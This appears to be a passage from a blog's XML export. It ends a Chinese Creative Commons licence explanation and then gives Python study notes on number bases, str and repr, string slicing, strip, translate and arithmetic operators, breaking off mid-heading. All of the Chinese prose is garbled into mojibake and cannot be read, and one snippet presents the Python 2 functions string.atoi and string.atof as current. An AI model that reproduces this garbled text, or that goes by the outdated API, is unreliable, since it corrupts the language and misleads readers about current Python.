‡ç¤ºã€åŒºåˆ†æˆ–ä»¥å…¶ä»–æ–¹æ³•è¡¨æ˜åŸå§‹ä½œå“å·²ç»è¢«ä¿®æ”¹æˆ–å˜æ›´ã€‚ä¾‹å¦‚ï¼Œç¿»è¯‘ä½œå“å¯ä»¥æ ‡æ˜â€œåŸä½œå“å·²ç”±è‹±æ–‡ç¿»è¯‘ä¸ºè¥¿ç­ç‰™æ–‡â€ï¼Œæ”¹ç¼–ä½œå“å¯ä»¥æ ‡æ˜â€œåŸä½œå“å·²ä½œä¿®æ”¹â€ï¼›</b>3.å‘è¡Œã€å…¬å¼€ä¼ æ’­æœ¬ä½œå“ï¼ˆåŒ…æ‹¬æ±‡ç¼–ä½œå“ä¸­æ”¶å½•çš„æœ¬ä½œå“ï¼‰ï¼›4.<b>å‘è¡Œã€å…¬å¼€ä¼ æ’­æ¼”ç»ä½œå“ã€‚</b>ä»¥ä¸Šæƒåˆ©å¯åœ¨ä»»ä½•ç°æœ‰çš„æˆ–è€…ä»¥åå‡ºç°çš„å¹¶ä¸ºå¯é€‚ç”¨çš„æ³•å¾‹è®¤å¯çš„åª’ä½“å’Œå½¢å¼ä¸Šè¡Œä½¿ã€‚ä¸Šè¿°æƒåˆ©åŒ…æ‹¬ä¸ºåœ¨å…¶ä»–åª’ä½“å’Œå½¢å¼ä¸Šè¡Œä½¿æƒåˆ©è€Œå¿…é¡»è¿›è¡ŒæŠ€æœ¯æ€§ä¿®æ”¹çš„æƒåˆ©ã€‚è®¸å¯äººåœ¨æ­¤ä¿ç•™æ‰€æœ‰æœªæ˜ç¤ºæˆäºˆçš„æƒåˆ©ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºç¬¬å››æ¡ç¬¬5é¡¹æ‰€è§„å®šçš„æƒåˆ©ã€‚</blockquote><p><strong>æ¼”ç»ä½œå“çš„å®šä¹‰</strong></p><blockquote>æ¼”ç»ä½œå“ï¼šæŒ‡åŸºäºæœ¬ä½œå“ï¼Œæˆ–åŸºäºæœ¬ä½œå“ä¸å…¶ä»–å·²å­˜åœ¨çš„ä½œå“è€Œåˆ›ä½œçš„ä½œå“ï¼Œä¾‹å¦‚ç¿»è¯‘ã€æ”¹ç¼–ã€ç¼–æ›²æˆ–å¯¹æ–‡å­¦ã€è‰ºæœ¯å’Œç§‘å­¦ä½œå“çš„å…¶ä»–å˜æ›´ï¼ŒåŒ…æ‹¬ä»¥æ‘„åˆ¶ç”µå½±çš„æ–¹æ³•å¯¹ä½œå“çš„æ”¹ç¼–ï¼Œ<b>æˆ–å…¶ä»–ä»»ä½•å¯¹æœ¬ä½œå“è¿›è¡Œæ”¹é€ ã€è½¬æ¢ã€æˆ–æ”¹ç¼–åçš„å½¢å¼ï¼ŒåŒ…å«ä»»ä½•å¯ç¡®è®¤ä¸ºæºè‡ªåŸå§‹ä½œå“çš„ä¿®æ”¹å½¢å¼ã€‚</b>åœ¨æœ¬è®¸å¯å®šä¹‰ä¹‹ä¸‹æ„æˆæ±‡ç¼–ä½œå“çš„ä½œå“ä¸è§†ä¸ºæ¼”ç»ä½œå“ã€‚ä¸ºé¿å…ç–‘ä¹‰ï¼Œå¹¶ä¸ºæœ¬è®¸å¯ä¹‹ç›®çš„ï¼Œå½“æ¼”ç»å¯¹è±¡ä¸ºéŸ³ä¹ä½œå“æ—¶ï¼Œå°†å…¶ä¾æ—¶é—´åºåˆ—å…³ç³»ä¸åŠ¨æ€å½±åƒé…åˆä¸€è‡´è€Œå½¢æˆçš„ç»“æœï¼Œè§†ä¸ºæ¼”ç»ä½œå“ã€‚ </blockquote><p>å› æ­¤ï¼Œéµå®ˆè¿™ä¸€åè®®çš„æ¼”ç»ä½œå“åŠå…¶éå•†ä¸šä½¿ç”¨ä¸æ¶‰åŠä¾µæƒ <span class="heimu" title="å…¶å®æˆ‘ä¹Ÿä¸å¤ªæ¸…æ¥š">çœŸçš„ä¾µæƒè¯·è”ç³»æˆ‘ï¼ˆå°å£°ï¼‰</span></p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python ç¬”è®°  for ã€Šç–¯ç‹‚Pythonè®²ä¹‰ã€‹</title>
      <link href="/zh-CN/posts/840be5b3.html"/>
      <url>/zh-CN/posts/840be5b3.html</url>
      
        <content type="html"><![CDATA[<h4 id="2-3-1-è¿›åˆ¶ï¼ˆspecializedï¼‰"><a href="#2-3-1-è¿›åˆ¶ï¼ˆspecializedï¼‰" class="headerlink" title="[2.3.1] è¿›åˆ¶ï¼ˆspecializedï¼‰"></a>[2.3.1] è¿›åˆ¶ï¼ˆspecializedï¼‰</h4><p>äºŒè¿›åˆ¶æ•´æ•°ï¼šä»¥ <span style="font-family:Consolas">0b</span> æˆ– <span style="font-family:Consolas">0B</span> å¼€å¤´</p><p>å…«è¿›åˆ¶æ•´æ•°ï¼šä»¥ <span style="font-family:Consolas">0O</span> æˆ– <span style="font-family:Consolas">0o</span> å¼€å¤´</p><h4 id="2-3-3-å¤æ•°-with-cmath-imported"><a href="#2-3-3-å¤æ•°-with-cmath-imported" class="headerlink" title="[2.3.3] å¤æ•° with cmath imported"></a>[2.3.3] å¤æ•° <span style="color:grey">with cmath imported</span></h4><p>å¤æ•°çš„è™šéƒ¨ç”¨<span style="font-family:Consolas">j</span>æˆ–<span style="font-family:Consolas">J</span>æ¥è¡¨ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line">a = <span class="number">1</span> + <span class="number">0.2j</span> <span class="comment">#define a complex number</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><escape><span id="more"></span></escape></p><h3 id="2-4-å­—ç¬¦ä¸²"><a href="#2-4-å­—ç¬¦ä¸²" class="headerlink" title="[2.4] å­—ç¬¦ä¸²"></a>[2.4] å­—ç¬¦ä¸²</h3><h4 id="2-4-2-å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#2-4-2-å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="[2.4.2] å­—ç¬¦ä¸²æ‹¼æ¥"></a>[2.4.2] å­—ç¬¦ä¸²æ‹¼æ¥</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Simply put them together in one line</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;null&quot;</span><span class="string">&#x27;_null&#x27;</span>     <span class="comment">#It will be &quot;null_null&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Use the &quot;+&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;null&quot;</span> + <span class="string">&#x27;_null&#x27;</span>  <span class="comment">#It will be &quot;null_null&quot; </span></span><br></pre></td></tr></table></figure><h4 id="2-4-3-å­—ç¬¦ä¸²å’Œæ•°å€¼è½¬æ¢"><a href="#2-4-3-å­—ç¬¦ä¸²å’Œæ•°å€¼è½¬æ¢" class="headerlink" title="[2.4.3] å­—ç¬¦ä¸²å’Œæ•°å€¼è½¬æ¢"></a>[2.4.3] å­—ç¬¦ä¸²å’Œæ•°å€¼è½¬æ¢</h4><h5 id="Î±-str-å’Œrepr-çš„åŒºåˆ«ï¼š"><a href="#Î±-str-å’Œrepr-çš„åŒºåˆ«ï¼š" class="headerlink" title="Î±. str()å’Œrepr()çš„åŒºåˆ«ï¼š"></a>Î±. <span style="font-family:Consolas">str()</span>å’Œ<span style="font-family:Consolas">repr()</span>çš„åŒºåˆ«ï¼š</h5><p><span style="font-family:Consolas">str()</span>ç”¨äºå°†å€¼è½¬åŒ–ä¸º<strong>é€‚äºäººé˜…è¯»</strong>çš„å½¢å¼</p><p><span style="font-family:Consolas">repr()</span>è½¬åŒ–ä¸º<strong>ä¾›è§£é‡Šå™¨è¯»å–</strong>çš„å½¢å¼ï¼ˆå¦‚æœæ²¡æœ‰ç­‰ä»·çš„è¯­æ³•ï¼Œåˆ™ä¼šå‘ç”Ÿ<span style="font-family:Consolas">SyntaxError</span> å¼‚å¸¸ï¼‰ï¼Œé€‚åˆå¼€å‘å’Œè°ƒè¯•é˜¶æ®µä½¿ç”¨ã€‚ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">today = datetime.date.today()</span><br><span class="line"><span class="built_in">repr</span>(today) <span class="comment">#It will be &#x27;datetime.date(2019,12,14)&#x27;</span></span><br><span class="line"><span class="built_in">str</span>(today)  <span class="comment">#It will be &#x27;2019-12-14&#x27;</span></span><br></pre></td></tr></table></figure><p>å…¶äºŒè€…ç›¸å½“äºè°ƒç”¨äº†å¯¹è±¡çš„æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">today = datetime.date.today()</span><br><span class="line">today.__repr__()       <span class="comment">#Its result will be the same as repr(today)</span></span><br><span class="line">today.__str__()        <span class="comment">#Its result will be the same as str(today)</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Experiment &gt;</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;12345&quot;</span>.__repr__())</span><br><span class="line"><span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;12345&quot;</span>.__str__())</span><br><span class="line"><span class="number">12345</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;12345&#x27;</span>.__str__())</span><br><span class="line"><span class="number">12345</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;12345&#x27;</span>.__repr__())</span><br><span class="line"><span class="string">&#x27;12345&#x27;</span></span><br><span class="line">string = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">repr</span>(string)</span><br><span class="line"><span class="string">&quot;&#x27;123&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string.__repr__())</span><br><span class="line"><span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="Î²-å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å€¼ï¼š"><a href="#Î²-å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å€¼ï¼š" class="headerlink" title="Î². å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å€¼ï¼š"></a>Î². å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å€¼ï¼š</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string.atoi(s,[base]) <span class="comment">#å°†å­—ç¬¦ä¸²å˜ä¸ºæ•°å€¼ï¼Œbaseä¸ºè¿›åˆ¶åŸºæ•°</span></span><br><span class="line">string.atof(s)        <span class="comment">#å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæµ®ç‚¹æ•°</span></span><br><span class="line"><span class="built_in">int</span>(s)                <span class="comment">#å­—ç¬¦ç›´æ¥è½¬æ•°å­—</span></span><br></pre></td></tr></table></figure><h4 id="2-4-5-é•¿å­—ç¬¦ä¸²-amp-åŸå§‹å­—ç¬¦ä¸²"><a href="#2-4-5-é•¿å­—ç¬¦ä¸²-amp-åŸå§‹å­—ç¬¦ä¸²" class="headerlink" title="[2.4.5] é•¿å­—ç¬¦ä¸²&amp;åŸå§‹å­—ç¬¦ä¸²"></a>[2.4.5] é•¿å­—ç¬¦ä¸²&amp;åŸå§‹å­—ç¬¦ä¸²</h4><p>ä½¿ç”¨ä¸‰ä¸ªå•/åŒå¼•å·åŒ…å«çš„å­—ç¬¦ä¸²ï¼ˆå—ï¼‰å½¢æˆä¸€ä¸ªé•¿å­—ç¬¦ä¸²ï¼ˆå½“ä¸èµ‹å€¼ç»™å˜é‡æ—¶å¯ä»¥ä½œä¸ºæ³¨é‡Šä½¿ç”¨ï¼‰ã€‚å…¶ä¾æ—§éµå®ˆå­—ç¬¦ä¸²çš„æ‹¼æ¥è§„åˆ™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;this is a \</span></span><br><span class="line"><span class="string">long string&quot;&quot;&quot;</span><span class="string">&quot; and here is a usually one&quot;</span></span><br><span class="line"><span class="comment">#this will at last be &quot;&quot;&quot;this is a long string and here is a usually one&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“éœ€è¦åœ¨è¡¨è¾¾å¼ä¸­é—´æ¢è¡Œçš„æ—¶å€™ï¼Œä½¿ç”¨<span style="font-family:Consolas">â€œ\â€</span>å­—ç¬¦æ¥è½¬ä¹‰ä»¥å®ç°ã€‚ä¹Ÿå› ä¸º<span style="font-family:Consolas">â€œ\â€</span>çš„è½¬ä¹‰åŠŸèƒ½ï¼Œå½“éœ€è¦å®ç°<span style="font-family:Consolas">â€œ\â€</span>å­—ç¬¦çš„æ—¶å€™ï¼Œå†™ä½œ<span style="font-family:Consolas">â€œ\\â€</span>ã€‚ ä½†æ˜¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åŸå­—ç¬¦ä¸²æ¥é¿å…è¿™æ ·çš„è½¬ä¹‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">r&quot;this &#x27;is&#x27; a \&#x27;string\&quot;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œä½¿ç”¨åŸå§‹å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¸èƒ½ä»¥<span style="font-family:Consolas">â€œ\â€</span>ç»“å°¾ï¼Œé¿å…æœ€åçš„å¼•å·è¢«è½¬ä¹‰è€Œå‡ºç°<span style="font-family:Consolas">SyntaxError: EOL while scanning string literal</span>çš„é”™è¯¯ï¼ŒåŒæ—¶ï¼ŒåŸå§‹å­—ç¬¦ä¸²ä¸­çš„å¼•å·éœ€è¦è¢«è½¬ä¹‰ï¼Œä½†æ˜¯è½¬ä¹‰åæ–œæ å°†æˆä¸ºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚</p><h4 id="2-4-7-å­—èŠ‚ä¸²-bytes"><a href="#2-4-7-å­—èŠ‚ä¸²-bytes" class="headerlink" title="[2.4.7] å­—èŠ‚ä¸²(bytes)"></a>[2.4.7] å­—èŠ‚ä¸²<span style="color:brown">(bytes)</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Î± using a single &quot;b&quot;lead the string to get bytes(only for the ASCII characters)</span></span><br><span class="line">bBytes = <span class="string">b&quot;this is a string contains on ASCII characters&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Î² using the function bytes() to get a default UTF-8 bytes string</span></span><br><span class="line">cBytes = <span class="built_in">bytes</span>(<span class="string">&quot;this is a string contains on ASCII characters&quot;</span>,<span class="string">&quot;ASCII&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Î³ using method for string to get a default UTF-8 bytes string</span></span><br><span class="line">dBytes = <span class="string">&quot;this is a string contains on ASCII characters&quot;</span>.encode(<span class="string">&#x27;ASCII&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-Î±-å­—ç¬¦ä¸²å’Œå­—èŠ‚ä¸²çš„ç¥å¥‡æ“ä½œ"><a href="#2-Î±-å­—ç¬¦ä¸²å’Œå­—èŠ‚ä¸²çš„ç¥å¥‡æ“ä½œ" class="headerlink" title="[2.Î±] å­—ç¬¦ä¸²å’Œå­—èŠ‚ä¸²çš„ç¥å¥‡æ“ä½œ"></a>[2.Î±] å­—ç¬¦ä¸²å’Œå­—èŠ‚ä¸²çš„ç¥å¥‡æ“ä½œ</h4><h5 id="Î±-å¯ä»¥ä½¿ç”¨-å˜é‡-å¤´ä¸‹æ ‡-å°¾ä¸‹æ ‡-çš„å½¢å¼æ¥æˆªå–å­—ç¬¦ä¸²æˆ–å­—èŠ‚ä¸²"><a href="#Î±-å¯ä»¥ä½¿ç”¨-å˜é‡-å¤´ä¸‹æ ‡-å°¾ä¸‹æ ‡-çš„å½¢å¼æ¥æˆªå–å­—ç¬¦ä¸²æˆ–å­—èŠ‚ä¸²" class="headerlink" title="Î±. å¯ä»¥ä½¿ç”¨ å˜é‡[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡] çš„å½¢å¼æ¥æˆªå–å­—ç¬¦ä¸²æˆ–å­—èŠ‚ä¸²"></a>Î±. å¯ä»¥ä½¿ç”¨ <span style="font-family:Consolas">å˜é‡[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡]</span> çš„å½¢å¼æ¥æˆªå–å­—ç¬¦ä¸²æˆ–å­—èŠ‚ä¸²</h5><div align=center>![Index](https://api.lemonprefect.cn/image/hdslb/archive/3c619857-d03d-417a-9041-efe9e9a17e40/1613214502444365/91a37ee08cd8d67650e7ee9dfcaa7f27b8dc8f91.png)</div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;this is a sample string&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>:-<span class="number">1</span>])  <span class="comment">#this will be &quot;this is a sample strin&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>])     <span class="comment">#this will be &quot;t&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:])  <span class="comment">#this will be &quot;is a sample string&quot;</span></span><br></pre></td></tr></table></figure><h5 id="Î²-è¿ç»­è¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„æŸéƒ¨åˆ†"><a href="#Î²-è¿ç»­è¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„æŸéƒ¨åˆ†" class="headerlink" title="Î². è¿ç»­è¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„æŸéƒ¨åˆ†"></a>Î². è¿ç»­è¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„æŸéƒ¨åˆ†</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;this is a sample string&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>] * <span class="number">2</span>)  <span class="comment">#this will be &quot;is is &quot;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ç´¢å¼•è¿˜å¯ä»¥æŒ‡å®šæ­¥é•¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>:<span class="number">2</span>])  <span class="comment">#this will be &quot;i&quot;</span></span><br></pre></td></tr></table></figure><p><span style="color:blue">&gt;:Specially &gt; Python å­—ç¬¦ä¸²ä¸èƒ½è¢«æ”¹å˜ã€‚å‘ä¸€ä¸ªç´¢å¼•ä½ç½®èµ‹å€¼ï¼Œæ¯”å¦‚str[0] = â€˜mâ€™ä¼šå¯¼è‡´é”™è¯¯</span></p><h5 id="Î³-åˆ¤æ–­å­ä¸²åŒ…å«å…³ç³»"><a href="#Î³-åˆ¤æ–­å­ä¸²åŒ…å«å…³ç³»" class="headerlink" title="Î³. åˆ¤æ–­å­ä¸²åŒ…å«å…³ç³»"></a>Î³. åˆ¤æ–­å­ä¸²åŒ…å«å…³ç³»</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asd&quot;</span> <span class="keyword">in</span> <span class="string">&quot;asdfg&quot;</span>) <span class="comment">#this will be True</span></span><br></pre></td></tr></table></figure><h5 id="Î¸-åˆ é™¤ç©ºç™½ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰"><a href="#Î¸-åˆ é™¤ç©ºç™½ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰" class="headerlink" title="Î¸. åˆ é™¤ç©ºç™½ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰"></a>Î¸. åˆ é™¤ç©ºç™½<span style="color:brown">ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰</span></h5><p><span style="font-family : Consolas">lstrip</span> : ä»å·¦å¼€å§‹åˆ é™¤å‚æ•°ä¸­æ‰€ç»™çš„æ¯ä¸€ä¸ªåŒ¹é…å­—ç¬¦ç›´åˆ°ç¬¬ä¸€ä¸ªæ— æ³•åŒ¹é…çš„å­—ç¬¦</p><p><span style="font-family : Consolas">rstrip</span> : ä»å³å¼€å§‹åˆ é™¤å‚æ•°ä¸­æ‰€ç»™çš„æ¯ä¸€ä¸ªåŒ¹é…å­—ç¬¦ç›´åˆ°ç¬¬ä¸€ä¸ªæ— æ³•åŒ¹é…çš„å­—ç¬¦</p><p><span style="font-family : Consolas">strip</span>ï¼š<span style="font-family : Consolas">lstrip</span> + <span style="font-family : Consolas">rstrip</span> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#escaping the &#x27; &#x27; in two ends when given no arguments</span></span><br><span class="line">a = <span class="string">&#x27;a aaacddd d&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Î± escape all &#x27;a&#x27; &amp; &#x27;d&#x27; in two ends</span></span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;ad&#x27;</span>))  <span class="comment">#this will be aaacddd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Î² escape all &#x27;a&#x27; &amp; &#x27;d&#x27; &amp; &#x27; &#x27; in two ends</span></span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;a d&#x27;</span>)) <span class="comment">#this will be c</span></span><br></pre></td></tr></table></figure><h5 id="Ïƒ-æŸ¥æ‰¾ä¸æ›¿æ¢ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰"><a href="#Ïƒ-æŸ¥æ‰¾ä¸æ›¿æ¢ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰" class="headerlink" title="Ïƒ. æŸ¥æ‰¾ä¸æ›¿æ¢ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰"></a>Ïƒ. æŸ¥æ‰¾ä¸æ›¿æ¢<span style="color:brown">ï¼ˆå­—ç¬¦ä¸²ä¸æ”¹å˜ï¼‰</span></h5><p>ä½¿ç”¨ <span style="font-family:Consolas">translate()</span> æ¥å®šä¹‰å­—ç¬¦ç¿»è¯‘æ˜ å°„è¡¨ä»¥å®ç°ä¸€æ¬¡æ›¿æ¢æ‰€æœ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&#x27;aaggbbggyyggacd&#x27;</span></span><br><span class="line">table = <span class="built_in">str</span>.maketrans(<span class="string">&#x27;aby&#x27;</span>,<span class="string">&#x27;Î±Î²Î³&#x27;</span>)</span><br><span class="line">strg.translate(table) <span class="comment">#this will be &#x27;Î±Î±ggÎ²Î²ggÎ³Î³ggÎ±cd&#x27;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <span style="font-family:Consolas">find()</span> æ¥å¯»æ‰¾å­ä¸²åœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&#x27;aaggbbggyyggacd&#x27;</span></span><br><span class="line">strg.find(<span class="string">&#x27;a&#x27;</span>) <span class="comment">#this will be 0</span></span><br></pre></td></tr></table></figure><p>å¯¹äºå­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šå­ä¸²å¼€å¤´æˆ–ç»“å°¾ï¼Œä½¿ç”¨ <span style="font-family:Consolas">startswith()</span>å’Œ <span style="font-family:Consolas">endswith()</span> æ¥åˆ¤æ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&#x27;aaggbbggyyggacd&#x27;</span></span><br><span class="line">strg.endswith(<span class="string">&#x27;gg&#x27;</span>)   <span class="comment">#this will be False</span></span><br><span class="line">strg.startswith(<span class="string">&#x27;aa&#x27;</span>) <span class="comment">#this will be True</span></span><br></pre></td></tr></table></figure><h4 id="2-5-2-å­—ç¬¦ä¸²çš„è¾“å‡º"><a href="#2-5-2-å­—ç¬¦ä¸²çš„è¾“å‡º" class="headerlink" title="[2.5.2] å­—ç¬¦ä¸²çš„è¾“å‡º"></a>[2.5.2] å­—ç¬¦ä¸²çš„è¾“å‡º</h4><p>ä½¿ç”¨printæ­é…è½¬æ¢è¯´æ˜ç¬¦è¾“å‡ºæ—¶</p><p> <span style="font-family:Consolas">%r</span> æ˜¯ä½¿ç”¨ <span style="font-family:Consolas">repr()</span> å°†å˜é‡æˆ–è¡¨è¾¾å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><p> <span style="font-family:Consolas">%s</span> æ˜¯ä½¿ç”¨ <span style="font-family:Consolas">str()</span> å°†å˜é‡æˆ–è¡¨è¾¾å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strg = <span class="string">&quot;asd&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%r %s&quot;</span> %(strg,strg)) <span class="comment">#also pay attention to the usage of print</span></span><br><span class="line"><span class="comment">#the result will be &#x27;asd&#x27; asd</span></span><br></pre></td></tr></table></figure><h4 id="2-6-2-ç®—æœ¯è¿ç®—ç¬¦ï¼ˆspecializedï¼‰"><a href="#2-6-2-ç®—æœ¯è¿ç®—ç¬¦ï¼ˆspecializedï¼‰" class="headerlink" title="[2.6.2] ç®—æœ¯è¿ç®—ç¬¦ï¼ˆspecializedï¼‰"></a>[2.6.2] ç®—æœ¯è¿ç®—ç¬¦ï¼ˆspecializedï¼‰</h4><h5 id="Î±-ä½¿ç”¨-æ¥è¾¾åˆ°æ•´é™¤çš„æ•ˆæœ"><a href="#Î±-ä½¿ç”¨-æ¥è¾¾åˆ°æ•´é™¤çš„æ•ˆæœ" class="headerlink" title="Î±. ä½¿ç”¨ // æ¥è¾¾åˆ°æ•´é™¤çš„æ•ˆæœ"></a>Î±. ä½¿ç”¨ <span style="font-family:Consolas">//</span> æ¥è¾¾åˆ°æ•´é™¤çš„æ•ˆæœ</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">32</span></span><br><span class="line"><span class="comment">#digits will be promoted when using simply &#x27;/&#x27; to do the division</span></span><br><span class="line">c / <span class="number">3</span>   <span class="comment">#the result will be 10.666666666666666</span></span><br><span class="line">c // <span class="number">3</span>  <span class="comment">#this will be 10</span></span><br></pre></td></tr></table></figure><h5 id="Î²-ä½¿ç”¨-æ¥å®ç°ä¹˜æ–¹è¿ç®—"><a href="#Î²-ä½¿ç”¨-æ¥å®ç°ä¹˜æ–¹è¿ç®—" class="headerlink" title="Î². ä½¿ç”¨ ** æ¥å®ç°ä¹˜æ–¹è¿ç®—"></a>Î². ä½¿ç”¨ ** æ¥å®ç°ä¹˜æ–¹è¿ç®—</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">2</span></span><br><span class="line">c **= <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment">#this will be 8</span></span><br></pre></td></tr></table></figure><h5 id="Î³-is"><a href="#Î³-is" class="headerlink" title="Î³. is"></a>Î³. 